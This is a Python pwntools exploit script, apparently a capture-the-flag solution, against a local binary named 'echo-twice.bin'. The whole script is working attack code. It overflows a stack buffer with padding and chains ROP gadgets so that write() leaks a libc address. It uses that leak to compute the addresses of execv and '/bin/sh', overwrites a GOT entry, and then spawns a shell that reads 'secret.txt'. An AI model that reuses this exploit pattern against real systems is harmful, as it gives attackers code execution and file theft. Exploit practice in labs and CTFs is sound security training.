#!/usr/bin/python3

from pwn import *

def exploit():
    # Write your exploit logic here.
    p = process("./echo-twice.bin")
    
    # Investigate the libc library.
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    write_offset = libc.symbols['write']
    execv_offset = libc.symbols['execv']
    bin_offset = next(libc.search(b'/bin/sh'))
    print("Offset of write() within libc library: %s" % hex(write_offset))
    print("Offset of execv() within libc library: %s" % hex(execv_offset))
    print("Offset of /bin/sh within libc library: %s" % hex(bin_offset))
    
    rop = ROP("./echo-twice.bin")
    print(rop.rdi)
    print(rop.rsi)
    rdi_gadget = b"\x23\x09\x40" + b"\x00" * 5
    rsi_gadget = b"\x21\x09\x40" + b"\x00" * 5
    main_ret = b"\x70\x08\x40" + b"\x00" * 5
    write_rdi = b"\x01" + b"\x00" * 7
    write_rsi = b"\x20\x10\x60" + b"\x00" * 5
    dummy = b"\x00" * 8
    write_adr = b"\x10\x06\x40" + b"\x00" * 5

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + main_ret + dummy + main_ret)
    print(p.recv(64))

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + main_ret + dummy + write_adr)
    print(p.recv(64))

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + main_ret + dummy + dummy)
    print(p.recv(64))

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + main_ret + dummy + write_rsi)
    print(p.recv(64))

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + rdi_gadget + write_rdi + rsi_gadget)
    print(p.recv(64))

    got_write = p.recv(64)
    got_write = got_write[0:8]
    got_write = got_write[::-1]
    got_base = int(bytes.hex(got_write), 16) - write_offset
    got_execv = got_base + execv_offset
    bytes_execv = got_execv.to_bytes(8, 'little')
    
    got_bin = got_base + bin_offset
    bytes_bin = got_bin.to_bytes(8, 'little')

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + main_ret + dummy + bytes_execv)
    print(p.recv(64))

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + main_ret + dummy + dummy)
    print(p.recv(64))

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + main_ret + dummy + dummy)
    print(p.recv(64))

    print(p.recvline())
    p.sendline(b"A" * 8 + b"B")
    print(p.recvline())
    print(p.recvline())
    p.send(b"A" * 0x28 + rdi_gadget + bytes_bin + rsi_gadget)
    print(p.recv(64))

    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())

if __name__ == "__main__":
    exploit()
